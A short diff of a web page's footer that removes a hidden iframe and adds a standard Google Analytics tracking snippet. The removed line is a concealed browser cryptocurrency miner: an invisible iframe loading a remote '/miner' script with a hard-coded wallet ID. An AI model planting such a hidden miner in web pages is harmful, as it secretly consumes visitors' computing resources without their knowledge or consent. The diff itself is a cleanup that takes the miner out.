@@ -107,6 +107,15 @@ Watch the <a href="http://bit.ly/19XjyNb">video</a>!
 	}
 	?>
 </div>
-<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 14FpXKYtUkQi9G5Ruj5PZibh1e3DtiHUme</script></iframe>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-49063518-1', 'commitlogsfromlastnight.com');
+  ga('send', 'pageview');
+
+</script>
 </body>
 </html>
